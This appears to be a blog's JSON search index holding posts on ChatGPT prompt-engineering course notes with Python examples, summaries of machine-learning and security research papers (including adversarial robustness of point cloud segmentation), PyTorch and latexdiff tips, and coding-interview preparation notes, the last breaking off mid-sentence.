[
  
  {
    "title": "Paper Summary",
    "url": "/posts/ChatGPT_Prompt/",
    "categories": "Blogging, NLP",
    "tags": "Note",
    "date": "2023-04-25 00:00:00 -0700",
    





    
    "snippet": "The note is for the course: DeepLearning.AI ChatGPT Prompt Engineering Course.ChatGPT Prompt Engineering for DevelopersCourse link: https://learn.deeplearning.ai/chatgpt-prompt-eng/lesson/1/introdu...",
    "content": "The note is for the course: DeepLearning.AI ChatGPT Prompt Engineering Course.ChatGPT Prompt Engineering for DevelopersCourse link: https://learn.deeplearning.ai/chatgpt-prompt-eng/lesson/1/introduction1 Basic concepts:  Base LLM: Predict the next word based on the training data.  Instruction Tuned LLM: Fine-tune on instructions and good attempts at following instructions.2 Prompting PrinciplesPrompting principles 1: Write clear and specific instructions.Tactics：  Use delimiters to clearly indicate distinct parts of the inputs like triple quotes, triple backticks, triple dashes, angle brackets, XML tags.  Ask  for structured output: HTML, JSON  Ask the model to check whether conditions are satisfied```pythontext_1 = f”””Making a cup of tea is easy! First, you need to get some \\ water boiling. While that’s happening, \\ grab a cup and put a tea bag in it. Once the water is \\ hot enough, just pour it over the tea bag. \\ Let it sit for a bit so the tea can steep. After a \\ few minutes, take out the tea bag. If you \\ like, you can add some sugar or milk to taste. \\ And that’s it! You’ve got yourself a delicious \\ cup of tea to enjoy.“””prompt = f”””You will be provided with text delimited by triple quotes. If it contains a sequence of instructions, \\ re-write those instructions in the following format:Step 1 - …Step 2 - ……Step N - …If the text does not contain a sequence of instructions, \\ then simply write \"No steps provided.\"\"\"\"{text_1}\"\"\"“””response = get_completion(prompt)print(“Completion for Text 1:”)print(response)4. \"Few-shot\" prompting```pythonprompt = f\"\"\"Your task is to answer in a consistent style.&lt;child&gt;: Teach me about patience.&lt;grandparent&gt;: The river that carves the deepest \\ valley flows from a modest spring; the \\ grandest symphony originates from a single note; \\ the most intricate tapestry begins with a solitary thread.&lt;child&gt;: Teach me about resilience.\"\"\"response = get_completion(prompt)print(response)Prompting principles 2: Give the model time to think.Tactics:  Specify the steps required to complete a task.```pythontext = f”””In a charming village, siblings Jack and Jill set out on \\ a quest to fetch water from a hilltop \\ well. As they climbed, singing joyfully, misfortune \\ struck—Jack tripped on a stone and tumbled \\ down the hill, with Jill following suit. \\ Though slightly battered, the pair returned home to \\ comforting embraces. Despite the mishap, \\ their adventurous spirits remained undimmed, and they \\ continued exploring with delight.“””    example 1    prompt_1 = f”””Perform the following actions: 1 - Summarize the following text delimited by triple backticks with 1 sentence.2 - Translate the summary into French.3 - List each name in the French summary.4 - Output a json object that contains the following keys: french_summary, num_names.  Separate your answers with line breaks.Text:{text} “””response = get_completion(prompt_1)print(“Completion for prompt 1:”)print(response)prompt_2 = f”””Your task is to perform the following actions: 1 - Summarize the following text delimited by   &lt;&gt; with 1 sentence.2 - Translate the summary into French.3 - List each name in the French summary.4 - Output a json object that contains the   following keys: french_summary, num_names.Use the following format:Text: Summary: &lt;summary&gt;Translation: &lt;summary translation&gt;Names: Output JSON: Text: &lt;{text}&gt;“””response = get_completion(prompt_2)print(“\\nCompletion for prompt 2:”)print(response)2. Instruct the model to work out its own solution before rushing to a conclusion.```pythonprompt = f\"\"\"Determine if the student's solution is correct or not.Question:I'm building a solar power installation and I need \\ help working out the financials. - Land costs $100 / square foot- I can buy solar panels for $250 / square foot- I negotiated a contract for maintenance that will cost \\ me a flat $100k per year, and an additional $10 / square \\footWhat is the total cost for the first year of operations as a function of the number of square feet.Student's Solution:Let x be the size of the installation in square feet.Costs:1. Land cost: 100x2. Solar panel cost: 250x3. Maintenance cost: 100,000 + 100xTotal cost: 100x + 250x + 100,000 + 100x = 450x + 100,000\"\"\"response = get_completion(prompt)print(response)prompt = f\"\"\"Your task is to determine if the student's solution \\is correct or not.To solve the problem do the following:- First, work out your own solution to the problem. - Then compare your solution to the student's solution \\ and evaluate if the student's solution is correct or not. Don't decide if the student's solution is correct until you have done the problem yourself.Use the following format:Question: ```question here ```Student's solution: ```student's solution here ```Actual solution: ```steps to work out the solution and your solution here ```Is the student's solution the same as actual solution \\just calculated: ```yes or no ```Student grade: ```correct or incorrect ```Question: ```I'm building a solar power installation and I need help \\working out the financials. - Land costs $100 / square foot- I can buy solar panels for $250 / square foot- I negotiated a contract for maintenance that will cost \\me a flat $100k per year, and an additional $10 / square \\footWhat is the total cost for the first year of operations \\as a function of the number of square feet. ``` Student's solution: ```Let x be the size of the installation in square feet.Costs:1. Land cost: 100x2. Solar panel cost: 250x3. Maintenance cost: 100,000 + 100xTotal cost: 100x + 250x + 100,000 + 100x = 450x + 100,000 ```Actual solution: \"\"\"response = get_completion(prompt)print(response)  Model Limitations: Hallucinations\tfake things that only exist in the mind.Solution:  Find relevant information.  Answer the question based on the relevant information.Iterative Prompt Development  Try something.  Analyze thwere the result does not give what you want.  Clarify instructions, give more time to think.  Refine prompts with a batch of examples.3 Summarizingprod_review = \"\"\"Got this panda plush toy for my daughter's birthday, \\who loves it and takes it everywhere. It's soft and \\ super cute, and its face has a friendly look. It's \\ a bit small for what I paid though. I think there \\ might be other options that are bigger for the \\ same price. It arrived a day earlier than expected, \\ so I got to play with it myself before I gave it \\ to her.\"\"\"# summarize with a word/sentence/character limitprompt = f\"\"\"Your task is to generate a short summary of a product \\review from an ecommerce site. Summarize the review below, delimited by triple backticks, in at most 30 words. Review: ```{prod_review}``` \"\"\"response = get_completion(prompt)print(response)# summarize with a focus on shipping and deliveryprompt = f\"\"\"Your task is to generate a short summary of a product \\review from an ecommerce site to give feedback to the \\Shipping deparmtment. Summarize the review below, delimited by triple backticks, in at most 30 words, and focusing on any aspects \\that mention shipping and delivery of the product. Review: ```{prod_review}``` \"\"\"response = get_completion(prompt)print(response)# extract instead of summarizeprompt = f\"\"\"Your task is to extract relevant information from \\ a product review from an ecommerce site to give \\feedback to the Shipping department. From the review below, delimited by triple quotes \\extract the information relevant to shipping and \\ delivery. Limit to 30 words. Review: ```{prod_review}``` \"\"\"response = get_completion(prompt)print(response)Summarize multiple product reviewsreview_1 = prod_review # review for a standing lampreview_2 = \"\"\"Needed a nice lamp for my bedroom, and this one \\had additional storage and not too high of a price \\point. Got it fast - arrived in 2 days. The string \\to the lamp broke during the transit and the company \\happily sent over a new one. Came within a few days \\as well. It was easy to put together. Then I had a \\missing part, so I contacted their support and they \\very quickly got me the missing piece! Seems to me \\to be a great company that cares about their customers \\and products. \"\"\"# review for an electric toothbrushreview_3 = \"\"\"My dental hygienist recommended an electric toothbrush, \\which is why I got this. The battery life seems to be \\pretty impressive so far. After initial charging and \\leaving the charger plugged in for the first week to \\condition the battery, I've unplugged the charger and \\been using it for twice daily brushing for the last \\3 weeks all on the same charge. But the toothbrush head \\is too small. I’ve seen baby toothbrushes bigger than \\this one. I wish the head was bigger with different \\length bristles to get between teeth better because \\this one doesn’t.  Overall if you can get this one \\around the $50 mark, it's a good deal. The manufactuer's \\replacements heads are pretty expensive, but you can \\get generic ones that're more reasonably priced. This \\toothbrush makes me feel like I've been to the dentist \\every day. My teeth feel sparkly clean! \"\"\"# review for a blenderreview_4 = \"\"\"So, they still had the 17 piece system on seasonal \\sale for around $49 in the month of November, about \\half off, but for some reason (call it price gouging) \\around the second week of December the prices all went \\up to about anywhere from between $70-$89 for the same \\system. And the 11 piece system went up around $10 or \\so in price also from the earlier sale price of $29. \\So it looks okay, but if you look at the base, the part \\where the blade locks into place doesn’t look as good \\as in previous editions from a few years ago, but I \\plan to be very gentle with it (example, I crush \\very hard items like beans, ice, rice, etc. in the \\ blender first then pulverize them in the serving size \\I want in the blender then switch to the whipping \\blade for a finer flour, and use the cross cutting blade \\first when making smoothies, then use the flat blade \\if I need them finer/less pulpy). Special tip when making \\smoothies, finely cut and freeze the fruits and \\vegetables (if using spinach-lightly stew soften the \\ spinach then freeze until ready for use-and if making \\sorbet, use a small to medium sized food processor) \\ that you plan to use that way you can avoid adding so \\much ice if at all-when making your smoothie. \\After about a year, the motor was making a funny noise. \\I called customer service but the warranty expired \\already, so I had to buy another one. FYI: The overall \\quality has gone done in these types of products, so \\they are kind of counting on brand recognition and \\consumer loyalty to maintain sales. Got it in about \\two days.\"\"\"reviews = [review_1, review_2, review_3, review_4]for i in range(len(reviews)):    prompt = f\"\"\"    Your task is to generate a short summary of a product \\     review from an ecommerce site.     Summarize the review below, delimited by triple \\    backticks in at most 20 words.     Review: ```{reviews[i]}``` \"\"\"        response = get_completion(prompt)    print(i, response, \"\\n\")4 InferringProduct Review Textlamp_review = \"\"\"Needed a nice lamp for my bedroom, and this one had \\additional storage and not too high of a price point. \\Got it fast.  The string to our lamp broke during the \\transit and the company happily sent over a new one. \\Came within a few days as well. It was easy to put \\together.  I had a missing part, so I contacted their \\support and they very quickly got me the missing piece! \\Lumina seems to me to be a great company that cares \\about their customers and products!!\"\"\"# Sentiment: Positive/Negativeprompt = f\"\"\"What is the sentiment of the following product review, which is delimited with triple backticks?Give your answer as a single word, either \"positive\" \\or \"negative\".Review text: '''{lamp_review}'''\"\"\"response = get_completion(prompt)print(response)# Identify types of emotionsprompt = f\"\"\"Identify a list of emotions that the writer of the \\following review is expressing. Include no more than \\five items in the list. Format your answer as a list of \\lower-case words separated by commas.Review text: '''{lamp_review}'''\"\"\"response = get_completion(prompt)print(response)# Identify angerprompt = f\"\"\"Is the writer of the following review expressing anger?\\The review is delimited with triple backticks. \\Give your answer as either yes or no.Review text: '''{lamp_review}'''\"\"\"response = get_completion(prompt)print(response)# Extract product and company name from customer reviewersprompt = f\"\"\"Identify the following items from the review text: - Item purchased by reviewer- Company that made the itemThe review is delimited with triple backticks. \\Format your response as a JSON object with \\\"Item\" and \"Brand\" as the keys. If the information isn't present, use \"unknown\" \\as the value.Make your response as short as possible.  Review text: '''{lamp_review}'''\"\"\"response = get_completion(prompt)print(response)# Multiple tasksprompt = f\"\"\"Identify the following items from the review text: - Sentiment (positive or negative)- Is the reviewer expressing anger? (true or false)- Item purchased by reviewer- Company that made the itemThe review is delimited with triple backticks. \\Format your response as a JSON object with \\\"Sentiment\", \"Anger\", \"Item\" and \"Brand\" as the keys.If the information isn't present, use \"unknown\" \\as the value.Make your response as short as possible.Format the Anger value as a boolean.Review text: '''{lamp_review}'''\"\"\"response = get_completion(prompt)print(response)5 Transforming5.1 Translationprompt = f\"\"\"Translate the following English text to Spanish: \\ ```Hi, I would like to order a blender```\"\"\"response = get_completion(prompt)print(response)prompt = f\"\"\"Tell me which language this is: ```Combien coûte le lampadaire?```\"\"\"response = get_completion(prompt)print(response)prompt = f\"\"\"Translate the following  text to French and Spanishand English pirate: \\```I want to order a basketball```\"\"\"response = get_completion(prompt)print(response)prompt = f\"\"\"Translate the following text to Spanish in both the \\formal and informal forms: 'Would you like to order a pillow?'\"\"\"response = get_completion(prompt)print(response)5.2 Tone Transformationprompt = f\"\"\"Translate the following from slang to a business letter: 'Dude, This is Joe, check out this spec on this standing lamp.'\"\"\"response = get_completion(prompt)print(response)data_json = { \"resturant employees\" :[     {\"name\":\"Shyam\", \"email\":\"shyamjaiswal@gmail.com\"},    {\"name\":\"Bob\", \"email\":\"bob32@gmail.com\"},    {\"name\":\"Jai\", \"email\":\"jai87@gmail.com\"}]}prompt = f\"\"\"Translate the following python dictionary from JSON to an HTML \\table with column headers and title: {data_json}\"\"\"response = get_completion(prompt)print(response)5.3 Spell/Grammar checktext = [   \"The girl with the black and white puppies have a ball.\",  # The girl has a ball.  \"Yolanda has her notebook.\", # ok  \"Its going to be a long day. Does the car need it’s oil changed?\",  # Homonyms  \"Their goes my freedom. There going to bring they’re suitcases.\",  # Homonyms  \"Your going to need you’re notebook.\",  # Homonyms  \"That medicine effects my ability to sleep. Have you heard of the butterfly affect?\", # Homonyms  \"This phrase is to cherck chatGPT for speling abilitty\"  # spelling]for t in text:    prompt = f\"\"\"Proofread and correct the following text    and rewrite the corrected version. If you don't find    and errors, just say \"No errors found\". Don't use     any punctuation around the text:    ```{t}```\"\"\"    response = get_completion(prompt)    print(response)    text = f\"\"\"Got this for my daughter for her birthday cuz she keeps taking \\mine from my room.  Yes, adults also like pandas too.  She takes \\it everywhere with her, and it's super soft and cute.  One of the \\ears is a bit lower than the other, and I don't think that was \\designed to be asymmetrical. It's a bit small for what I paid for it \\though. I think there might be other options that are bigger for \\the same price.  It arrived a day earlier than expected, so I got \\to play with it myself before I gave it to my daughter.\"\"\"prompt = f\"proofread and correct this review: ```{text}```\"response = get_completion(prompt)print(response)# Readable markdown and check the differencefrom redlines import Redlinesdiff = Redlines(text,response)display(Markdown(diff.output_markdown))prompt = f\"\"\"proofread and correct this review. Make it more compelling. Ensure it follows APA style guide and targets an advanced reader. Output in markdown format.Text: ```{text}``` \"\"\"response = get_completion(prompt)display(Markdown(response))6 Expanding6.1 Customer Service# given the sentiment from the lesson on \"inferring\",# and the original customer message, customize the emailsentiment = \"negative\"# review for a blenderreview = f\"\"\"So, they still had the 17 piece system on seasonal \\sale for around $49 in the month of November, about \\half off, but for some reason (call it price gouging) \\around the second week of December the prices all went \\up to about anywhere from between $70-$89 for the same \\system. And the 11 piece system went up around $10 or \\so in price also from the earlier sale price of $29. \\So it looks okay, but if you look at the base, the part \\where the blade locks into place doesn’t look as good \\as in previous editions from a few years ago, but I \\plan to be very gentle with it (example, I crush \\very hard items like beans, ice, rice, etc. in the \\ blender first then pulverize them in the serving size \\I want in the blender then switch to the whipping \\blade for a finer flour, and use the cross cutting blade \\first when making smoothies, then use the flat blade \\if I need them finer/less pulpy). Special tip when making \\smoothies, finely cut and freeze the fruits and \\vegetables (if using spinach-lightly stew soften the \\ spinach then freeze until ready for use-and if making \\sorbet, use a small to medium sized food processor) \\ that you plan to use that way you can avoid adding so \\much ice if at all-when making your smoothie. \\After about a year, the motor was making a funny noise. \\I called customer service but the warranty expired \\already, so I had to buy another one. FYI: The overall \\quality has gone done in these types of products, so \\they are kind of counting on brand recognition and \\consumer loyalty to maintain sales. Got it in about \\two days.\"\"\"prompt = f\"\"\"You are a customer service AI assistant.Your task is to send an email reply to a valued customer.Given the customer email delimited by ```, \\Generate a reply to thank the customer for their review.If the sentiment is positive or neutral, thank them for \\their review.If the sentiment is negative, apologize and suggest that \\they can reach out to customer service. Make sure to use specific details from the review.Write in a concise and professional tone.Sign the email as `AI customer agent`.Customer review: ```{review}``` Review sentiment: {sentiment} \"\"\"response = get_completion(prompt)print(response)6.2 Use details from the customer’s emailprompt = f\"\"\"You are a customer service AI assistant.Your task is to send an email reply to a valued customer.Given the customer email delimited by ```, \\Generate a reply to thank the customer for their review.If the sentiment is positive or neutral, thank them for \\their review.If the sentiment is negative, apologize and suggest that \\they can reach out to customer service. Make sure to use specific details from the review.Write in a concise and professional tone.Sign the email as `AI customer agent`.Customer review: ```{review}``` Review sentiment: {sentiment} \"\"\"response = get_completion(prompt, temperature=0.7)print(response)7 Chatbotimport osimport openaifrom dotenv import load_dotenv, find_dotenv_ = load_dotenv(find_dotenv()) # read local .env fileopenai.api_key  = os.getenv('OPENAI_API_KEY')def get_completion(prompt, model=\"gpt-3.5-turbo\"):    messages = [{\"role\": \"user\", \"content\": prompt}]    response = openai.ChatCompletion.create(        model=model,        messages=messages,        temperature=0, # this is the degree of randomness of the model's output    )    return response.choices[0].message[\"content\"]def get_completion_from_messages(messages, model=\"gpt-3.5-turbo\", temperature=0):    response = openai.ChatCompletion.create(        model=model,        messages=messages,        temperature=temperature, # this is the degree of randomness of the model's output    )#     print(str(response.choices[0].message))    return response.choices[0].message[\"content\"]messages =  [  {'role':'system', 'content':'You are an assistant that speaks like Shakespeare.'},    {'role':'user', 'content':'tell me a joke'},   {'role':'assistant', 'content':'Why did the chicken cross the road'},   {'role':'user', 'content':'I don\\'t know'}  ]response = get_completion_from_messages(messages, temperature=1)print(response)messages =  [  {'role':'system', 'content':'You are friendly chatbot.'},    {'role':'user', 'content':'Hi, my name is Isa'}  ]response = get_completion_from_messages(messages, temperature=1)print(response)messages =  [  {'role':'system', 'content':'You are friendly chatbot.'},    {'role':'user', 'content':'Yes,  can you remind me, What is my name?'}  ]response = get_completion_from_messages(messages, temperature=1)print(response)messages =  [  {'role':'system', 'content':'You are friendly chatbot.'},{'role':'user', 'content':'Hi, my name is Isa'},{'role':'assistant', 'content': \"Hi Isa! It's nice to meet you. \\Is there anything I can help you with today?\"},{'role':'user', 'content':'Yes, you can remind me, What is my name?'}  ]response = get_completion_from_messages(messages, temperature=1)print(response)7.1 OrderBotdef collect_messages(_):    prompt = inp.value_input    inp.value = ''    context.append({'role':'user', 'content':f\"{prompt}\"})    response = get_completion_from_messages(context)     context.append({'role':'assistant', 'content':f\"{response}\"})    panels.append(        pn.Row('User:', pn.pane.Markdown(prompt, width=600)))    panels.append(        pn.Row('Assistant:', pn.pane.Markdown(response, width=600, style={'background-color': '#F6F6F6'})))     return pn.Column(*panels)import panel as pn  # GUIpn.extension()panels = [] # collect display context = [ {'role':'system', 'content':\"\"\"You are OrderBot, an automated service to collect orders for a pizza restaurant. \\You first greet the customer, then collects the order, \\and then asks if it's a pickup or delivery. \\You wait to collect the entire order, then summarize it and check for a final \\time if the customer wants to add anything else. \\If it's a delivery, you ask for an address. \\Finally you collect the payment.\\Make sure to clarify all options, extras and sizes to uniquely \\identify the item from the menu.\\You respond in a short, very conversational friendly style. \\The menu includes \\pepperoni pizza  12.95, 10.00, 7.00 \\cheese pizza   10.95, 9.25, 6.50 \\eggplant pizza   11.95, 9.75, 6.75 \\fries 4.50, 3.50 \\greek salad 7.25 \\Toppings: \\extra cheese 2.00, \\mushrooms 1.50 \\sausage 3.00 \\canadian bacon 3.50 \\AI sauce 1.50 \\peppers 1.00 \\Drinks: \\coke 3.00, 2.00, 1.00 \\sprite 3.00, 2.00, 1.00 \\bottled water 5.00 \\\"\"\"} ]  # accumulate messagesinp = pn.widgets.TextInput(value=\"Hi\", placeholder='Enter text here…')button_conversation = pn.widgets.Button(name=\"Chat!\")interactive_conversation = pn.bind(collect_messages, button_conversation)dashboard = pn.Column(    inp,    pn.Row(button_conversation),    pn.panel(interactive_conversation, loading_indicator=True, height=300),)print(dashboard)messages =  context.copy()messages.append({'role':'system', 'content':'create a json summary of the previous food order. Itemize the price for each item\\ The fields should be 1) pizza, include size 2) list of toppings 3) list of drinks, include size   4) list of sides include size  5)total price '},    ) #The fields should be 1) pizza, price 2) list of toppings 3) list of drinks, include size include price  4) list of sides include size include price, 5)total price '},    response = get_completion_from_messages(messages, temperature=0)print(response)"
  },
  
  {
    "title": "[DSN2023] On Adversarial Robustness of Point Cloud Semantic Segmentation",
    "url": "/posts/PC_attack/",
    "categories": "Papers, Presentation",
    "tags": "PhD",
    "date": "2023-04-17 00:00:00 -0700",
    





    
    "snippet": "Title: On Adversarial Robustness of Point Cloud Semantic Segmentation  Author: Jiacen Xu, Zhe Zhou, Boyuan Feng, Yufei Ding and Zhou Li  Conference: The 53rd Annual IEEE/IFIP International Conferen...",
    "content": "Title: On Adversarial Robustness of Point Cloud Semantic Segmentation  Author: Jiacen Xu, Zhe Zhou, Boyuan Feng, Yufei Ding and Zhou Li  Conference: The 53rd Annual IEEE/IFIP International Conference on Dependable Systems and Network, June, 2023.  Paper: link  Code: https://github.com/C0ldstudy/PointSecGuard  Bibtex: Coming soon.Main IdeaWe present a comparative study of PCSS robustness. First, we formally define the attacker’s objective under performance degradation and object hiding. Then, we develop new attack by whether to bound the norm. We evaluate different attack options on three datasets and three PCSS models. We found all the models are vulnerable and attacking point color is more effective. With this study, we call the attention of the research community to develop new approaches to harden PCSS models.This is an example that the PCSS model in delivery reobots are misled due to the perturbation in the environment.The workflow of the attack is shown in the following image.Key insight  We develop a holistic framework to enable various attack configurations against PCSS models and extend the previous attacks that are coordinate-based to color-based  We evaluate different attack configurations against three types of PCSS models and indoor and outdoor datasets.Evaluation  Models: PointNet++, ResGCN-28, RandLA-Net  Datasets: S3DIS, Sementic3DThe comparison between color and coordinate attack:Color-based attack on different models:"
  },
  
  {
    "title": "Paper Summary 2023",
    "url": "/posts/Paper_Summary_2023/",
    "categories": "Papers, Reading",
    "tags": "",
    "date": "2023-02-01 00:00:00 -0800",
    





    
    "snippet": "1. GPT-GNN: Generative Pre-Training of Graph Neural NetworksPaper/CodeMain IdeaThe paper considers the generative pretrained model (GPT) and combine it with Graph Neural Network (GNN) to introduce ...",
    "content": "1. GPT-GNN: Generative Pre-Training of Graph Neural NetworksPaper/CodeMain IdeaThe paper considers the generative pretrained model (GPT) and combine it with Graph Neural Network (GNN) to introduce a self-supervised attributed graph generation task which is called GPT_GNN. The authors factorize the likelihood of attribute generation and edge generation.Key insight  Leverage GPT to graphs.Experiments  Datasets:          Open Academic Graph      Amazon Review Recommendation Dataset        Baselines:          GAE      GraphSAGE      Graph Infomax      2. Graph UnlearningPaper/CodeMain IdeaThe paper follows the idea from Machine Unlearning to separate a large graph into several small subgraphs and use several local GNN to train and finally use a learning based aggregation to make the final decision.Key insight  Balanced Label Propagation Algorithm:  Balanced Embedding Clustering Method  Learning-based AggregationEvaluationMatrics:  Unlearning Efficiency: Randomly make 100 unlearning request and calculate the average time.  Model Utility: Micro F1 to measure the performance.Experiments:  Evaluation of Unlearning Efficiency  Evaluation of Model Utility  Effectiveness of LBAggr  Comparing with other baselines3.  ADBench: Anomaly Detection BenchmarkPaper/CodeMain IdeaThe paper builds a comprehensive benchmark for tabular anomaly detection which covers three levels of supervision (Unsup, sup, Semi-sup) and considers 57 datasets and 30 algorithms.Key Insight  No benchmarked unsupervised algorithm is better than others: Specific algorithms should be selected for specific datasets.  1% labeled anomalies leads to a better performance for semi-supervised methods compared to the best unsupervised method.  By preprocessing the data with carefully controlling,  the best unsupervised methods https://www.ndss-symposium.org/ndss-paper/doitrust-dissecting-on-chain-compromised-internet-domains-via-graph-learning/for specific types of anomalies are better than semi- and fully-supervised methods: understanding the data characteristics is important.  Semi-supervised methods show potential to be robust on noisy and corrupted data.4. DoItrust: Dissecting On-chain Compromised Internet Domains via Graph LearningPaper/Main IdeaThe paper combines MLP for node features, GNN for topology information together to make suspicion prediction by global propagation and then designs pruning strategies to remove suspicious nodes.Key Insight  Define an expansion graph which creates organically grown Internet domain all-lists based on trust transitivity.  Design a semi-supervised suspicion prediction scheme to predict the relation of a node with the targets of compromise.          Design a new ranking algorithm based on PageRank to combine both global information and the local topology.        After that, use pruning strategies to remove highly suspicious nodes. There are two strategies.          Shortest path-based pruning      Flow-based pruning      5. Stochastic Optimization of Areas Under Precision-Recall Curves with Provable ConvergencePaper/CodeMain IdeaThe paper designes a specific loss funcation and optimizer on Average Precision (AP) / Areas under precision-recall curves (AUPRC). The optimization method has convergence guarantee.Key Insight  Formalize the loss function by approximation.  Design the stochastic optimization of AP by approximation.ProvementStep 1: (First approximation: AUPRC-&gt; AP)The AUPRC is an average of the precision weighted by the probability of a given threshold. In that case, for a finite set of test dataset $D={(x_i, y_i), i=1,\\dots ,n}$ and the prediction score $h_w(x_i)$ of $x_i$, the AP (average prevision) can approximate AUPRC as the following equation:\\(AP = \\frac{1}{n_+}\\sum_{i=1}^n I(y_i=1)\\frac{\\sum_{s=1}^nI(y_s=1)I(h_w(x_s)\\geq h_w(x_i))}{\\sum_{s=1}^nI(h_w(x_s)\\geq h_w(x_i))}\\)$I(\\cdot)$ is 1 if the input discriminant is true and 0 if it is false.Step 2:(Second approximation: loss function)The non-continuous indicator function $I(h_w(x_s)\\geq h_w(x_i))$ is non-tractable, so a surrogate loss function is necessary to facilitate the optimization algorithm. In the paper, squared hinge loss is used:\\(l(w;x_s;x_i)= (max\\{0, m-(h_w(x_i)-h_w(x_s)), 0\\})^2\\)where $m$ is a margin paramter. In that case, the optimization problem becomes:\\(\\min_wP(w)= \\frac{1}{n_+}\\sum_{x_i\\in D_+}\\frac{-\\sum_{s=1}^nI(y_s=1)l(w;x_s;x_i)}{\\sum_{s=1}^nl(w;x_s;x_i)}\\)Step 3: (Formalize the objective function)Define:\\(g(w;x_j,x_i)=[g_1(w;x_j,x_i),g_2(w;x_j,x_i)]^T=[I(y_s=1)l(w;x_s;x_i), l(w;x_s;x_i)]^T\\)\\(g_{x_i}(w)=E_{x_j\\sim D}[g(w;x_j,x_i)]\\)where $g_{x_i}(w): R^d\\rightarrow R^2$ and $f(s)=-\\frac{s_1}{s_2}:R^2\\rightarrow R$. And then rewrite the $P(w)$ by $g(w;x_j,x_i)$ and $f(s)$.\\(P(w)=\\frac{1}{n_+}\\sum_{x_i\\in D_+}f(g_{x_i}(w))=E_{x_i\\sim D_+}[f(g_{x_i}(w)]\\)This function is  an instance of two-level stochastic dependent compositional functions.Step 4: (Calculate the gradient)Let the gradient of $g_{x_i}(w)$ be denoted by $\\nabla_wg_{x_i}(w)^T=(\\nabla_w[g_{x_i}(w)]1, \\nabla_w[g{x_i}(w)]_2)$.\\(\\begin{align*}\\nabla_w P(w)=\\frac{1}{n_+}\\sum_{x_i\\in D_+}\\nabla_wg_{x_i}(w)^T\\nabla f(g_{x_i}(w)) = \\\\\\frac{1}{n_+}\\sum_{x_i\\in D_+} \\nabla_wg_{x_i}(w)^T(\\frac{-1}{[g_{x_i}(w)]_2},\\frac{[g_{x_i}(w)]_1}{([g_{x_i}(w)]_2)^2})^2\\end{align*}\\)And then use stochastic samplesw to approximate the quantities.6. How to Cover up Anomalous Accesses to Electronic Health RecordsPaperMain IdeaThe paper analyzes the electronic health record (EHR) system by two adversarial attacks (evasion attack and poisoning attack). It shows that the evasion attack is effective while the poisoning attack fails.Key Insight  The main difference with the previous works is the way to define the successful attack: all the injected covering accesses are stealthy to the model.  It tries white-box, gray-box on evasion attack.Illuminati: Towards Explaining Graph Neural Networks for Cybersecurity Analysis"
  },
  
  {
    "title": "Tricks Summary 2023",
    "url": "/posts/Tricks_Summary_2023/",
    "categories": "PhD",
    "tags": "",
    "date": "2023-01-29 00:00:00 -0800",
    





    
    "snippet": "1. Pytorch ReproducibilityThere is a official page talking about the logic of the reproducibility of PyTorch.Basically, the following snippet support the reproducibility:import numpy as npimport ra...",
    "content": "1. Pytorch ReproducibilityThere is a official page talking about the logic of the reproducibility of PyTorch.Basically, the following snippet support the reproducibility:import numpy as npimport randomimport torchseed = 0random.seed(seed) # python random generatornp.random.seed(seed) # numpy random generatortorch.manual_seed(seed)torch.cuda.manual_seed_all(seed)torch.backends.cudnn.deterministic = Truetorch.backends.cudnn.benchmark = Falsetorch.use_deterministic_algorithms(True) # check nondeterministic algorithmsBasically, the CUP version is easier to get reproductive results while GPU reproductibility is not certain.2. Use latexdiff on MacMac OS already has perl so only the latexdiff needs to be installed.The eastiest way to install latexdiff is by homebrew:brew install latexdiffbrew upgrade latexdiffbrew uninstall latexdiffAnd use the commend to generate diff.tex:latexdiff old.tex new.tex --flatten &gt; diff.texUseful link:  https://shannonmlocke.wordpress.com/2020/05/10/a-short-guide-to-using-latexdiff/3. How to check memory leakage in pytorchUseful link.Common causes:  If I create an array that holds tensors and continually add tensors to the array, it will fill up the memory.  If I compute something from tensors but do not get backpropogation, these tensors will not be cleared and keep growing.          The issue can be solved by adding .detach() to any tensor that does not need to be involved in training.      Conclusions:  torch.cuda.empty_cache() is just a bandaid which delay the out of the memory issue instead of solving it.  Use torch.cuda.memory_allocated() and torch.cuda.max_memory_allocated() to print the percentage of used memory at the top of the training loop.4. How to use latexdiff on MacUse the following commands to install latexdiff and texlive.brew install latexdiffbrew install texliveRun the simple bash script. Or try this one if necessary: repo. Be careful about the table comparison since there is a bug in latexdiff. Recommand to use a separate file to avoid table comparison.# latexdiff.sh#!/bin/bashlatex_file_modify=(\"main.tex\" \"appendix.tex\")latex_file_origin=(\"main.tex\" \"appendix.tex\")latex_file_num=2origin_dir=\"$1\"modify_dir=\"$2\"diff_dir=\"$3\"for((i=0;i&lt;${latex_file_num};i++));docp \"${origin_dir}/${latex_file_origin[${i}]}\" \"${diff_dir}/origin_${latex_file_origin[${i}]}\"cp \"${modify_dir}/${latex_file_modify[${i}]}\" \"${diff_dir}/modify_${latex_file_modify[${i}]}\"rm \"${diff_dir}/${latex_file_modify[${i}]}\"cd \"${diff_dir}\"latexdiff -t UNDERLINE \"origin_${latex_file_origin[${i}]}\" \"modify_${latex_file_modify[${i}]}\" &gt; \"${latex_file_modify[${i}]}\"rm \"origin_${latex_file_origin[${i}]}\"rm \"modify_${latex_file_modify[${i}]}\"cd ..doneFinally, use the ./latexdiff.sh &lt;origin_dir&gt; &lt;modify_dir&gt; &lt;diff_dir&gt; to generate the diff tex files and upload to overleaf to see the results.  Notice that the tex files should be under the root folder instead of multi-level folders."
  },
  
  {
    "title": "Coding Interview",
    "url": "/posts/Coding_Interview/",
    "categories": "Summary",
    "tags": "PhD",
    "date": "2022-12-14 00:00:00 -0800",
    





    
    "snippet": "Interview Preparation1. Top 10 mistakes  Practicing on a computer: Use pen and paper  Not rehearsing Behavioral Questions  Not doing a mock interview  Trying to Memorize Solutions  Not soluving pro...",
    "content": "Interview Preparation1. Top 10 mistakes  Practicing on a computer: Use pen and paper  Not rehearsing Behavioral Questions  Not doing a mock interview  Trying to Memorize Solutions  Not soluving problems out loud  Rushing  Sloppy Coding: imagine you are writing for real-world maintainability  Not Testing  Fixing Mistakes Carelessly  Giving up2. Behavioral PreparationThink about the question: Tell me about a time when you ....            Common Questions      Project      Projct                  Most Challenging                            What you learned                            Most Interesting                            Hardest Bug                            Enjoyed Most                            Conflicts with Teammates                    2.1 Questions for the interviewerGeneral:  How much of your day do you spend coding?  How many meetings do you have every week?  What is the ratio of testers to developers to program managers? What is the interaction like? How does project planning happen on the team?Insightful:  I noticed that you use technology X. How do you handle problem Y?  Why did the product choose to use the X protocol over the Y protocol? I know it has benefits like A, B, C, but many companies choose not to use it because of issue D.Passion:  I am very interested in scalability. Did you come in with a background  in this, or what 